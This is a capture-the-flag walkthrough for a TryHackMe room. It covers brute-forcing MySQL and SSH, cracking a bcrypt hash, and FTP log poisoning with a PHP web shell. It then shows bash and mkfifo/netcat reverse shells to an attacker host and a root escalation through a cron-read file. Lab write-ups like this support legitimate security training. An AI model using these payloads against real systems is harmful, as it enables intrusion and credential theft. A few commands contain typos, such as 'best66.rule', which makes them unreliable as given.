# [Brute](https://tryhackme.com/room/ettubrute)

## You as well, Brutus?

# What is the root and user flag?

## You won't be able to just brute your way into this one, or will you?

### What is the user flag?

1. Run a port scan with service version detection to enumerate all open services on the target.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Brute-force the MySQL `root` account.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>
```

3. Connect to the MySQL instance using the discovered credentials.

```bash
mysql -h <TARGET_IP> -u root -prockyou --skip-ssl`
```

4. Enumerate databases to find the web application's data, then extract user credentials.

```sql
SHOW DATABASES;
USE website;
SHOW TABLES;
SELECT * FROM users;
```

**Results:**

```
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
```

5. Save the hash to a file and crack it with John the Ripper against the rockyou wordlist.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

6. Log in to the web application at `http://<TARGET_IP>/index.php` with credentials `Adrian:tigger`. After authentication, `welcome.php` becomes accessible. This page includes and renders the vsftpd FTP server log.

7. Exploit **FTP log poisoning**: connect to the FTP service and supply a PHP one-liner as the username. The vsftpd daemon logs all login attempts including the supplied username, embedding our PHP code into `/var/log/vsftpd.log`. Since `welcome.php` includes this log file and Apache processes it as PHP, the code will execute on every subsequent request.

```bash
ftp <TARGET_IP>
# Username: '<?php system($_GET['cmd']); ?>'
quit
```

8. Verify remote code execution by issuing a test command through the `cmd` GET parameter. Because `welcome.php` now renders the poisoned log, our PHP one-liner executes.

> Visiting `http://<TARGET_IP>/welcome.php?cmd=whoami` returns `www-data`, confirming RCE as the Apache web server user.

9. Set up a Netcat listener on the attacker machine to receive the reverse shell.

```bash
nc -lvnp 4444
```

10. URL-encode the bash reverse shell payload and pass it via `?cmd=`. URL-encoding is required because characters like `&`, `>`, and spaces would otherwise be interpreted by the browser or web server before reaching PHP.

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

11. Search for all files owned by the `adrian` user to find data accessible from the compromised web server process and clues for lateral movement.

```bash
find / -user adrian -type f 2>/dev/null
```

**Results:**

```
/home/adrian/.viminfo
/home/adrian/user.txt
/home/adrian/.profile
/home/adrian/.bashrc
/home/adrian/.bash_logout
/home/adrian/punch_in
/home/adrian/.selected_editor
/home/adrian/ftp/files/.notes
/home/adrian/ftp/files/script
/home/adrian/.sudo_as_admin_successful
/home/adrian/.reminder
```

12. Read the `.reminder` file to uncover a hint about Adrian's SSH password.

```bash
cat /home/adrian/.reminder
```

**Results:**

```
Rules:
best of 64
+ exclamation

ettubrute
```

> This tells us Adrian's SSH password is based on the word `ettubrute` with an exclamation mark appended, then mutated using hashcat's `best64` rule set - a collection of 64 common password transformations such as case toggling, character substitution, and string reversal.

13. Generate a targeted wordlist by applying the `best64` rule transformations to the base passphrase.

```bash
echo 'ettubrute!' > word
hashcat --force word -r /usr/share/hashcat/rules/best66.rule --stdout > wordlistBest64.txt
```

14. Brute-force SSH for user `adrian` using the generated wordlist.

```bash
hydra -l adrian -P wordlistBest64.txt ssh://<TARGET_IP>
```

15. Log in via SSH with the discovered credentials.

```bash
ssh adrian@<TARGET_IP>
# Password: theettubrute!
```

16. Read the user flag.

```bash
cat user.txt
```

[SCREEN01]

---

###

1. Examine the `script` file found in Adrian's FTP directory. It reads each line from `/home/adrian/punch_in` and passes it to `/usr/bin/sh -c` as a command.

```bash
cat ftp/files/script
```

**Results:**

```
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

2. Set up a Netcat listener on the attacker machine to receive the incoming root shell.

```bash
nc -lvnp 4444
```

3. Overwrite `punch_in` with a reverse shell payload. The `mkfifo` named pipe technique creates a bidirectional shell over the Netcat connection. When the cron job executes `script` as root, it reads this line from `punch_in`, triggering the reverse shell.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f" > punch_in
```

4. Read the root flag.

```bash
cat root.txt
```

[SCREEN02]
